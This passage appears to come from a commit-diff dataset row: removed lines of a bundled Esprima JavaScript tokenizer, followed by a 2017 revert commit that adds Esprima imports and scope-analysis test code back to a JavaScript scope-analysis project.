++lineNumber;<\n>-                    ++index;<\n>-                    lineStart = index;<\n>-                    if (index >= length) {<\n>-                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                    }<\n>-                } else {<\n>-                    ch = source.charCodeAt(index++);<\n>-                    if (index >= length) {<\n>-                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                    }<\n>-                    // Block comment ends with '*/' (char #42<c> char #47).<\n>-                    if (ch === 42) {<\n>-                        ch = source.charCodeAt(index);<\n>-                        if (ch === 47) {<\n>-                            ++index;<\n>-                            blockComment = false;<\n>-                        }<\n>-                    }<\n>-                }<\n>-            } else if (ch === 47) {<\n>-                ch = source.charCodeAt(index + 1);<\n>-                // Line comment starts with '//' (char #47<c> char #47).<\n>-                if (ch === 47) {<\n>-                    index += 2;<\n>-                    lineComment = true;<\n>-                } else if (ch === 42) {<\n>-                    // Block comment starts with '/*' (char #47<c> char #42).<\n>-                    index += 2;<\n>-                    blockComment = true;<\n>-                    if (index >= length) {<\n>-                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                    }<\n>-                } else {<\n>-                    break;<\n>-                }<\n>-            } else if (isWhiteSpace(ch)) {<\n>-                ++index;<\n>-            } else if (isLineTerminator(ch)) {<\n>-                ++index;<\n>-                if (ch === 13 && source.charCodeAt(index) === 10) {<\n>-                    ++index;<\n>-                }<\n>-                ++lineNumber;<\n>-                lineStart = index;<\n>-            } else {<\n>-                break;<\n>-            }<\n>-        }<\n>-    }<\n>-    function scanHexEscape(prefix) {<\n>-        var i<c> len<c> ch<c> code = 0;<\n>-        len = (prefix === 'u') ? 4 : 2;<\n>-        for (i = 0; i < len; ++i) {<\n>-            if (index < length && isHexDigit(source[index])) {<\n>-                ch = source[index++];<\n>-                code = code * 16 + '0123456789abcdef'.indexOf(ch.toLowerCase());<\n>-            } else {<\n>-                return '';<\n>-            }<\n>-        }<\n>-        return String.fromCharCode(code);<\n>-    }<\n>-    function scanUnicodeCodePointEscape() {<\n>-        var ch<c> code<c> cu1<c> cu2;<\n>-        ch = source[index];<\n>-        code = 0;<\n>-        // At least<c> one hex digit is required.<\n>-        if (ch === '}') {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        while (index < length) {<\n>-            ch = source[index++];<\n>-            if (!isHexDigit(ch)) {<\n>-                break;<\n>-            }<\n>-            code = code * 16 + '0123456789abcdef'.indexOf(ch.toLowerCase());<\n>-        }<\n>-        if (code > 0x10FFFF || ch !== '}') {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        // UTF-16 Encoding<\n>-        if (code <= 0xFFFF) {<\n>-            return String.fromCharCode(code);<\n>-        }<\n>-        cu1 = ((code - 0x10000) >> 10) + 0xD800;<\n>-        cu2 = ((code - 0x10000) & 1023) + 0xDC00;<\n>-        return String.fromCharCode(cu1<c> cu2);<\n>-    }<\n>-    function getEscapedIdentifier() {<\n>-        var ch<c> id;<\n>-        ch = source.charCodeAt(index++);<\n>-        id = String.fromCharCode(ch);<\n>-        // '\u' (char #92<c> char #117) denotes an escaped character.<\n>-        if (ch === 92) {<\n>-            if (source.charCodeAt(index) !== 117) {<\n>-                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-            }<\n>-            ++index;<\n>-            ch = scanHexEscape('u');<\n>-            if (!ch || ch === '\\' || !isIdentifierStart(ch.charCodeAt(0))) {<\n>-                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-            }<\n>-            id = ch;<\n>-        }<\n>-        while (index < length) {<\n>-            ch = source.charCodeAt(index);<\n>-            if (!isIdentifierPart(ch)) {<\n>-                break;<\n>-            }<\n>-            ++index;<\n>-            id += String.fromCharCode(ch);<\n>-            // '\u' (char #92<c> char #117) denotes an escaped character.<\n>-            if (ch === 92) {<\n>-                id = id.substr(0<c> id.length - 1);<\n>-                if (source.charCodeAt(index) !== 117) {<\n>-                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                }<\n>-                ++index;<\n>-                ch = scanHexEscape('u');<\n>-                if (!ch || ch === '\\' || !isIdentifierPart(ch.charCodeAt(0))) {<\n>-                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                }<\n>-                id += ch;<\n>-            }<\n>-        }<\n>-        return id;<\n>-    }<\n>-    function getIdentifier() {<\n>-        var start<c> ch;<\n>-        start = index++;<\n>-        while (index < length) {<\n>-            ch = source.charCodeAt(index);<\n>-            if (ch === 92) {<\n>-                // Blackslash (char #92) marks Unicode escape sequence.<\n>-                index = start;<\n>-                return getEscapedIdentifier();<\n>-            }<\n>-            if (isIdentifierPart(ch)) {<\n>-                ++index;<\n>-            } else {<\n>-                break;<\n>-            }<\n>-        }<\n>-        return source.slice(start<c> index);<\n>-    }<\n>-    function scanIdentifier() {<\n>-        var start<c> id<c> type;<\n>-        start = index;<\n>-        // Backslash (char #92) starts an escaped character.<\n>-        id = (source.charCodeAt(index) === 92) ? getEscapedIdentifier() : getIdentifier();<\n>-        // There is no keyword or literal with only one character.<\n>-        // Thus<c> it must be an identifier.<\n>-        if (id.length === 1) {<\n>-            type = Token.Identifier;<\n>-        } else if (isKeyword(id)) {<\n>-            type = Token.Keyword;<\n>-        } else if (id === 'null') {<\n>-            type = Token.NullLiteral;<\n>-        } else if (id === 'true' || id === 'false') {<\n>-            type = Token.BooleanLiteral;<\n>-        } else {<\n>-            type = Token.Identifier;<\n>-        }<\n>-        return {<\n>-            type: type<c><\n>-            value: id<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    // 7.7 Punctuators<\n>-    function scanPunctuator() {<\n>-        var start = index<c><\n>-            code = source.charCodeAt(index)<c><\n>-            code2<c><\n>-            ch1 = source[index]<c><\n>-            ch2<c><\n>-            ch3<c><\n>-            ch4;<\n>-        switch (code) {<\n>-        // Check for most common single-character punctuators.<\n>-        case 40:   // ( open bracket<\n>-        case 41:   // ) close bracket<\n>-        case 59:   // ; semicolon<\n>-        case 44:   // <c> comma<\n>-        case 123:  // { open curly brace<\n>-        case 125:  // } close curly brace<\n>-        case 91:   // [<\n>-        case 93:   // ]<\n>-        case 58:   // :<\n>-        case 63:   // ?<\n>-        case 126:  // ~<\n>-            ++index;<\n>-            if (extra.tokenize) {<\n>-                if (code === 40) {<\n>-                    extra.openParenToken = extra.tokens.length;<\n>-                } else if (code === 123) {<\n>-                    extra.openCurlyToken = extra.tokens.length;<\n>-                }<\n>-            }<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: String.fromCharCode(code)<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        default:<\n>-            code2 = source.charCodeAt(index + 1);<\n>-            // '=' (char #61) marks an assignment or comparison operator.<\n>-            if (code2 === 61) {<\n>-                switch (code) {<\n>-                case 37:  // %<\n>-                case 38:  // &<\n>-                case 42:  // *:<\n>-                case 43:  // +<\n>-                case 45:  // -<\n>-                case 47:  // /<\n>-                case 60:  // <<\n>-                case 62:  // ><\n>-                case 94:  // ^<\n>-                case 124: // |<\n>-                    index += 2;<\n>-                    return {<\n>-                        type: Token.Punctuator<c><\n>-                        value: String.fromCharCode(code) + String.fromCharCode(code2)<c><\n>-                        lineNumber: lineNumber<c><\n>-                        lineStart: lineStart<c><\n>-                        range: [start<c> index]<\n>-                    };<\n>-                case 33: // !<\n>-                case 61: // =<\n>-                    index += 2;<\n>-                    // !== and ===<\n>-                    if (source.charCodeAt(index) === 61) {<\n>-                        ++index;<\n>-                    }<\n>-                    return {<\n>-                        type: Token.Punctuator<c><\n>-                        value: source.slice(start<c> index)<c><\n>-                        lineNumber: lineNumber<c><\n>-                        lineStart: lineStart<c><\n>-                        range: [start<c> index]<\n>-                    };<\n>-                default:<\n>-                    break;<\n>-                }<\n>-            }<\n>-            break;<\n>-        }<\n>-        // Peek more characters.<\n>-        ch2 = source[index + 1];<\n>-        ch3 = source[index + 2];<\n>-        ch4 = source[index + 3];<\n>-        // 4-character punctuator: >>>=<\n>-        if (ch1 === '>' && ch2 === '>' && ch3 === '>') {<\n>-            if (ch4 === '=') {<\n>-                index += 4;<\n>-                return {<\n>-                    type: Token.Punctuator<c><\n>-                    value: '>>>='<c><\n>-                    lineNumber: lineNumber<c><\n>-                    lineStart: lineStart<c><\n>-                    range: [start<c> index]<\n>-                };<\n>-            }<\n>-        }<\n>-        // 3-character punctuators: === !== >>> <<= >>=<\n>-        if (ch1 === '>' && ch2 === '>' && ch3 === '>') {<\n>-            index += 3;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '>>>'<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '<' && ch2 === '<' && ch3 === '=') {<\n>-            index += 3;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '<<='<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '>' && ch2 === '>' && ch3 === '=') {<\n>-            index += 3;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '>>='<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '.' && ch2 === '.' && ch3 === '.') {<\n>-            index += 3;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '...'<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        // Other 2-character punctuators: ++ -- << >> && ||<\n>-        if (ch1 === ch2 && ('+-<>&|'.indexOf(ch1) >= 0)) {<\n>-            index += 2;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: ch1 + ch2<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '=' && ch2 === '>') {<\n>-            index += 2;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '=>'<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if ('<>=!+-*%&|^/'.indexOf(ch1) >= 0) {<\n>-            ++index;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: ch1<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '.') {<\n>-            ++index;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: ch1<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-    }<\n>-    // 7.8.3 Numeric Literals<\n>-    function scanHexLiteral(start) {<\n>-        var number = '';<\n>-        while (index < length) {<\n>-            if (!isHexDigit(source[index])) {<\n>-                break;<\n>-            }<\n>-            number += source[index++];<\n>-        }<\n>-        if (number.length === 0) {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        if (isIdentifierStart(source.charCodeAt(index))) {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        return {<\n>-            type: Token.NumericLiteral<c><\n>-            value: parseInt('0x' + number<c> 16)<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    function scanOctalLiteral(prefix<c> start) {<\n>-        var number<c> octal;<\n>-        if (isOctalDigit(prefix)) {<\n>-            octal = true;<\n>-            number = '0' + source[index++];<\n>-        } else {<\n>-            octal = false;<\n>-            ++index;<\n>-            number = '';<\n>-        }<\n>-        while (index < length) {<\n>-            if (!isOctalDigit(source[index])) {<\n>-                break;<\n>-            }<\n>-            number += source[index++];<\n>-        }<\n>-        if (!octal && number.length === 0) {<\n>-            // only 0o or 0O<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        if (isIdentifierStart(source.charCodeAt(index)) || isDecimalDigit(source.charCodeAt(index))) {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        return {<\n>-            type: Token.NumericLiteral<c><\n>-            value: parseInt(number<c> 8)<c><\n>-            octal: octal<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    function scanNumericLiteral() {<\n>-        var number<c> start<c> ch<c> octal;<\n>-        ch = source[index];<\n>-        assert(isDecimalDigit(ch.charCodeAt(0)) || (ch === '.')<c><\n>-            'Numeric literal must start with a decimal digit or a decimal point');<\n>-        start = index;<\n>-        number = '';<\n>-        if (ch !== '.') {<\n>-            number = source[index++];<\n>-            ch = source[index];<\n>-            // Hex number starts with '0x'.<\n>-            // Octal number starts with '0'.<\n>-            // Octal number in ES6 starts with '0o'.<\n>-            // Binary number in ES6 starts with '0b'.<\n>-            if (number === '0') {<\n>-                if (ch === 'x' || ch === 'X') {<\n>-                    ++index;<\n>-                    return scanHexLiteral(start);<\n>-                }<\n>-                if (ch === 'b' || ch === 'B') {<\n>-                    ++index;<\n>-                    number = '';<\n>-                    while (index < length) {<\n>-                        ch = source[index];<\n>-                        if (ch !== '0' && ch !== '1') {<\n>-                            break;<\n>-                        }<\n>-                        number += source[index++];<\n>-                    }<\n>-                    if (number.length === 0) {<\n>-                        // only 0b or 0B<\n>-                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                    }<\n>-                    if (index < length) {<\n>-                        ch = source.charCodeAt(index);<\n>-                        /* istanbul ignore else */<\n>-                        if (isIdentifierStart(ch) || isDecimalDigit(ch)) {<\n>-                            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                        }<\n>-                    }<\n>-                    return {<\n>-                        type: Token.NumericLiteral<c><\n>-                        value: parseInt(number<c> 2)<c><\n>-                        lineNumber: lineNumber<c><\n>-                        lineStart: lineStart<c><\n>-                        range: [start<c> index]<\n>-                    };<\n>-                }<\n>-                if (ch === 'o' || ch === 'O' || isOctalDigit(ch)) {<\n>-                    return scanOctalLiteral(ch<c> start);<\n>-                }<\n>-                // decimal number starts with '0' such as '09' is illegal.<\n>-                if (ch && isDecimalDigit(ch.charCodeAt(0))) {<\n>-                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                }<\n>-            }<\n>-            while (isDecimalDigit(source.charCodeAt(index))) {<\n>-                number += source[index++];<\n>-            }<\n>-            ch = source[index];<\n>-        }<\n>-        if (ch === '.') {<\n>-            number += source[index++];<\n>-            while (isDecimalDigit(source.charCodeAt(index))) {<\n>-                number += source[index++];<\n>-            }<\n>-            ch = source[index];<\n>-        }<\n>-        if (ch === 'e' || ch === 'E') {<\n>-            number += source[index++];<\n>-            ch = source[index];<\n>-            if (ch === '+' || ch === '-') {<\n>-                number += source[index++];<\n>-            }<\n>-            if (isDecimalDigit(source.charCodeAt(index))) {<\n>-                while (isDecimalDigit(source.charCodeAt(index))) {<\n>-                    number += source[index++];<\n>-                }<\n>-            } else {<\n>-                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-            }<\n>-        }<\n>-        if (isIdentifierStart(source.charCodeAt(index))) {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        return {<\n>-            type: Token.NumericLiteral<c><\n>-            value: parseFloat(number)<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    // 7.8.4 String Literals<\n>-    function scanStringLiteral() {<\n>-        var str = ''<c> quote<c> start<c> ch<c> code<c> unescaped<c> restore<c> octal = false;<\n>-        quote = source[index];<\n>-        assert((quote === '\'' || quote === '""')<c><\n>-            'String literal must starts with a quote');<\n>-        start = index;<\n>-        ++index;<\n>-        while (index < length) {<\n>-            ch = source[index++];<\n>-            if (ch === quote) {<\n>-                quote = '';<\n>-                break;<\n>-            } else if (ch === '\\') {<\n>-                ch = source[index++];<\n>-                if (!ch || !isLineTerminator(ch.charCodeAt(0))) {<\n>-                    switch (ch) {<\n>-                    case 'n':<\n>-                        str += '\n';<\n>-                        break;<\n>-                    case 'r':<\n>-                        str += '\r';<\n>-                        break;<\n>-                    case 't':<\n>-                        str += '\t';<\n>-                        break;<\n>-                    case 'u':<\n>-                    case 'x':<\n>-                        if (source[index] === '{') {<\n>-                            ++index;<\n>-                            str += scanUnicodeCodePointEscape();<\n>-                        } else {<\n>-                            restore = index;<\n>-                            unescaped = scanHexEscape(ch);<\n>-                            if (unescaped) {<\n>-                                str += unescaped;<\n>-                            } else {<\n>-                                index = restore;<\n>-                                str += ch;<\n>-                            }<\n>-                        }<\n>-                        break;<\n>-                    case 'b':<\n>-                        str += '\b';<\n>-                        break;<\n>-                    case 'f':<\n>-                        str += '\f';<\n>-                        break;<\n>-                    case 'v':<\n>-                        str += '\x0B';<\n>-                        break;<\n>-                    default:<\n>-                        if (isOctalDigit(ch)) {<\n>-                            code = '01234567'.indexOf(ch);<\n>-                            // \0 is not octal escape sequence<\n>-                            if (code !== 0) {<\n>-                                octal = true;<\n>-                            }<\n>-                            /* istanbul ignore else */<\n>-                            if (index < length && isOctalDigit(source[index])) {<\n>-                                octal = true;<\n>-                                code = code * 8 + '01234567'.indexOf(source[index++]);<\n>-                                // 3 digits are only allowed when string starts<\n>-                                // with 0<c> 1<c> 2<c> 3<\n>-                                if ('0123'.indexOf(ch) >= 0 &&<\n>-                                        index < length &&<\n>-                                        isOctalDigit(source[index])) {<\n>-                                    code = code * 8 + '01234567'.indexOf(source[index++]);<\n>-                                }<\n>-                            }<\n>-                            str += String.fromCharCode(code);<\n>-                        } else {<\n>-                            str += ch;<\n>-                        }<\n>-                        break;<\n>-                    }<\n>-                } else {<\n>-                    ++lineNumber;<\n>-                    if (ch ===  '\r' && source[index] === '\n') {<\n>-                        ++index;<\n>-                    }<\n>-                    lineStart = index;<\n>-                }<\n>-            } else if (isLineTerminator(ch.charCodeAt(0))) {<\n>-                break;<\n>-            } else {<\n>-                str += ch;<\n>-            }<\n>-        }<\n>-        if (quote !== '') {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        return {<\n>-            type: Token.StringLiteral<c><\n>-            value: str<c><\n>-            octal: octal<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    function scanTemplate() {<\n>-        var cooked = ''<c> ch<c> start<c> terminated<c> tail<c> restore<c> unescaped<c> code<c> octal;<\n>-        terminated = false;<\n>-        tail = false;<\n>-        start = index;<\n>-        ++index;<\n>-        while (index < length) {<\n>-            ch = source[index++];<\n>-            if (ch === '`') {<\n>-                tail = true;<",F
17,56,56,569,4,26,James Henry,13,3,225,2,User,0,2955,Wed,18,28,22 Feb 2017,Revert Chore: Remove esprima (#18),0,1,42,4990,201339,"+esprima.js<\n>+    TEST_FILES = ""test/**/*.js"";<\n>+var esprima = require('esprima');<\n>+var ast = esprima.parse(code);<\n>+        <\n>+        <\n>+    ""esprima"": ""^2.7.1""<c><\n>+         * @member {esprima.Identifier} Definition#name - the identifier AST node of the occurrence.<\n>+         * @member {esprima.Node} Definition#node - the enclosing node of the identifier.<\n>+         * @member {esprima.Node?} Definition#parent - the enclosing statement node of the identifier.<\n>+ * Mozilla Parser API</a>. E.g. <a href=""http://esprima.org"">esprima</a> is a parser<\n>+ * Main interface function. Takes an Esprima syntax tree and returns the<\n>+ * @param {esprima.Tree} tree - Abstract Syntax Tree<\n>+    // But espree 2.0 and esprima 2.0 parse to ArrayExpression<c> ObjectExpression<c> etc...<\n>+         * @member {esprima#Identifier} Reference#identifier<\n>+             * @member {esprima#Node} Reference#writeExpr<\n>+     * @param {Esprima.Node} node - a node to get.<\n>+     * @param {Esprima.Node} node - node for the acquired scope.<\n>+     * @param {Esprima.Node} node - node for the acquired scope.<\n>+     * @param {Esprima.Node} node - releasing node.<\n>+         * @member {esprima.Node} Scope#block<\n>+     * @param {Esprima.Identifier} ident - identifier to be resolved.<\n>+         * @member {esprima.Identifier[]} Variable#identifiers<\n>+const esprima = require(""esprima"");<\n>+        const ast = esprima.parse(`<\n>+const esprima = require(""esprima"");<\n>+        const ast = esprima.parse(`<\n>+const esprima = require(""esprima"");<\n>+        const ast = esprima.parse(`<\n>+        const ast = esprima.parse(`<\n>+        const ast = esprima.parse(`<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+        const ast = parse(""var arrow = (a<c> b<c> c<c> d) => {}"");<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+        // FIXME After Esprima's bug is fixed<c> I'll add tests #33<\n>+        // https://github.com/estools/escope/issues/33#issuecomment-64135832<\n>+        //<\n>+        // expect(scope.variables).to.have.length(4);<\n>+        // expect(scope.variables[0].name).to.be.equal('a');<\n>+        // expect(scope.variables[1].name).to.be.equal('b');<\n>+        // expect(scope.variables[2].name).to.be.equal('c');<\n>+        // expect(scope.variables[3].name).to.be.equal('d');<\n>+        // expect(scope.references).to.have.length(0);<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+const espree = require(""../third_party/espree"");<\n>+const harmony = require(""../third_party/esprima"");<\n>+const espree = require(""../third_party/espree"");<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        let ast = harmony.parse(`<\n>+        ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        let ast = harmony.parse(`<\n>+        ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+        expect(scope.variables[3].defs[0].rest).to.be.false;<\n>+        // ast = espree.parse(`<\n>+        //     (function ([a<c> b<c> ...[c<c> d<c> ...rest]]) {<\n>+        //     }(array));<\n>+        // `);<\n>+        // scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        // expect(scopeManager.scopes).to.have.length(2);<\n>+        // scope = scopeManager.scopes[0];<\n>+        // expect(scope.type).to.be.equal('global');<\n>+        // expect(scope.variables).to.have.length(0);<\n>+        // expect(scope.references).to.have.length(0);<\n>+        // expect(scope.implicit.left).to.have.length(1);<\n>+        // expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>+        // scope = scopeManager.scopes[1];<\n>+        // expect(scope.type).to.be.equal('function');<\n>+        // expect(scope.variables).to.have.length(6);<\n>+        // const expectedVariableNames = [<\n>+        //     'arguments'<\n>+        //     'a'<\n>+        //     'b'<\n>+        //     'c'<\n>+        //     'd'<\n>+        //     'rest'<\n>+        // ];<\n>+        // for (let index = 0; index < expectedVariableNames.length; index++) {<\n>+        //     expect(scope.variables[index].name).to.be.equal(expectedVariableNames[index]);<\n>+        // }<\n>+        // expect(scope.references).to.have.length(6);<\n>+        // const expectedReferenceNames = [<\n>+        //         'a'<\n>+        //         'b'<\n>+        //         'c'<\n>+        //         'd'<\n>+        //         'rest'<\n>+        //     ]<\n>+        // for (let index = 0; index < expectedReferenceNames.length; index++) {<\n>+        //     expect(scope.references[index].identifier.name).to.be.equal(expectedReferenceNames[index]);<\n>+        //     expect(scope.references[index].isWrite()).to.be.true<\n>+        //     expect(scope.references[index].partial).to.be.true<\n>+        // }<\n>+        // expect(scope.references[5].identifier.name).to.be.equal('array');<\n>+        // expect(scope.references[5].isWrite()).to.be.false;<\n>+        const ast = harmony.parse(`<\n>+        const ast = harmony.parse(`<\n>+const espree = require(""../third_party/espree"");<\n>+        const ast = espree(""export var v;""<c> {sourceType: ""module""});<\n>+        const ast = espree(""export default function f(){};""<c> {sourceType: ""module""});<\n>+        const ast = espree(""export default function(){};""<c> {sourceType: ""module""});<\n>+        const ast = espree(""export default 42;""<c> {sourceType: ""module""});<\n>+        const ast = espree(""export {x};""<c> {sourceType: ""module""});<\n>+        const ast = espree(""export {v as x};""<c> {sourceType: ""module""});<\n>+        const ast = espree(""export {x} from \""mod\"";""<c> {sourceType: ""module""});<\n>+        const ast = espree(""export {v as x} from \""mod\"";""<c> {sourceType: ""module""});<\n>+        const ast = espree(""export * from \""mod\"";""<c> {sourceType: ""module""});<\n>+const espree = require(""../third_party/espree"");<\n>+        const ast = espree(""import v from \""mod\"";""<c> {sourceType: ""module""});<\n>+        const ast = espree( ""import * as ns from \""mod\"";""<c> {sourceType: ""module""<\n>+        });<\n>+        const ast = espree(""import {x} from \""mod\"";""<c> {sourceType: ""module""<\n>+        });<\n>+        const ast = espree(""import {x as v} from \""mod\"";""<c> {sourceType: ""module""});<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+const parse = require(""../third_party/espree"");<\n>+        const ast = parse(`<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+const esprima = require(""../third_party/esprima"").parse;<\n>+const espree = require(""../third_party/espree"");<\n>+    it(""materialize rest argument in scope (esprima: rest property of FunctionDeclaration)""<c> function() {<\n>+        const ast = esprima(`<\n>+            function foo(...bar) {<\n>+                return bar;<\n>+            }<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables).to.have.length(2);<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""bar"");<\n>+        expect(scope.variables[1].defs[0].name.name).to.be.equal(""bar"");<\n>+        expect(scope.variables[1].defs[0].rest).to.be.true;<\n>+    });<\n>+    it(""materialize rest argument in scope (espree: RestElement)""<c> function() {<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+const esprima = require(""../third_party/esprima"");<\n>+        const ast = esprima.parse(`<\n>+        const ast = esprima.parse(`<\n>+        analyze(ast); // default is `fallback: 'iteration'`<\n>+        const ast = esprima.parse(`<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+const espree = require(""../third_party/espree"");<\n>+    /**<\n>+     * Verify<\n>+     * @param {AST} ast - Abstract syntax tree<\n>+     * @param {string} type - type<\n>+     * @param {array} expectedNamesList - expected names<\n>+     * @returns {void}<\n>+     */<\n>+            [""A""<c> ""A""]<c> // outer scope's and inner scope's.<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>+            {sourceType: ""module""}<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>+            {sourceType: ""module""}<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>+            {sourceType: ""module""}<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>+            {sourceType: ""module""}<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(""b++;"");<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+    it(""assignment doesn't leak""<c> function() {<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+    it(""for-in-statement doesn't leaks""<c> function() {<\n>+        const ast = parse(`<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+                    'use strict';<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+            function foo() {}`<c><\n>+            {sourceType: ""module""}<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(""function bar() { q: for(;;) { break q; } }"");<\n>+        const ast = parse(`<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+            'use strict';<\n>+        const ast = parse(`<\n>+            import {x as v} from ""mod"";`<c><\n>+            {sourceType: ""module"" }<\n>+    it(""doesn't require property type""<c> function() {<\n>+        // Hardcoded AST.  Esprima adds an extra 'Property'<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+        const ast = parse(`<\n>+        `);<\n>+const espree = require(""../third_party/espree"");<\n>+const parse = 